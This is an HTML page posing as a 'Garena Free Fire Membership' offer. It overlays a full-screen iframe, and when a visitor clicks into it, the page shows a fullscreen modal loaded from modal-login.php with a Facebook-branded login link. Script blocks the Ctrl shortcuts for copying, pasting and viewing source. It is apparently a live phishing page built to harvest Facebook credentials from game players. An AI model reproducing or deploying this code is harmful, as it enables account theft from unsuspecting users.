
<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KyZXEAg3QhqLMpG8r+8fhAXLRk2vvoC2f3B09zVXn8CA5QIVfZOJ3BCsw2P0p/We" crossorigin="anonymous">
    <title>Garena Free Fire Membership</title>
    <meta content='Garena Free Fire Membership' property='og:site_name'/>
<meta content='http://tuanori.com' property='og:url'/>
<meta content='website' property='og:type'/>
<meta content='Nhấn vào đây...' property='og:description'/>
<meta content='Garena Free Fire Membership' property='og:title'/>
<meta content='https://i.imgur.com/a7AHV0G.png' property='og:image'/>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <style>
         img, svg {
    vertical-align: middle;
    display: block;
    margin: auto;
    margin-top: 10%;
}
img, svg {
    vertical-align: middle;
    display: block;
    margin: auto;
    margin-top: 10%;
    -webkit-box-shadow: 0 2px 5px 0 rgb(0 0 0 / 20%), 0 2px 10px 0 rgb(0 0 0 / 10%);
    box-shadow: 0 2px 5px 0 rgb(0 0 0 / 20%), 0 2px 10px 0 rgb(0 0 0 / 10%);
}
     </style>
  </head>
  <body>
 <iframe id="iframe" src="https://ticchien11.github.io/ticchien/member.html" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden">
</iframe>
<div class="modal" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
<div class="modal-dialog modal-fullscreen">
    <div class="modal-content">
      <div class="modal-body" id="login">
          <a href="/login.php"><img src="/tuanori_facebook.png"/></a>
      </div>
    </div>
  </div>
</div>
   <script>
    $.post("./modal-login.php", {id: '302819525'}, function(result){
    $("#login").html(result);
  });
    focus();
var listener = addEventListener('blur', function() {
	if(document.activeElement === document.getElementById('iframe')) {
$('#staticBackdrop').appendTo("body").modal('show');
	}
    removeEventListener(listener);
});
document.onkeydown = function(e) {
        if (e.ctrlKey && 
            (e.keyCode === 67 || 
             e.keyCode === 86 || 
             e.keyCode === 85 || 
             e.keyCode === 117)) {
            alert('not allowed');
            return false;
        } else {
            return true;
        }
};
</script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js" integrity="sha384-eMNCOe7tC1doHpGoWe/6oMVemdAVTMs2xqW4mwXrXsW0L84Iytr2wi5v2QjrP/xp" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.min.js" integrity="sha384-cn7l7gDp0eyniUwwAZgrzD06kc/tftFf19TOAs2zVinnD/C7E91j9yyk5//jjpt/" crossorigin="anonymous"></script>
  </body>
</html>
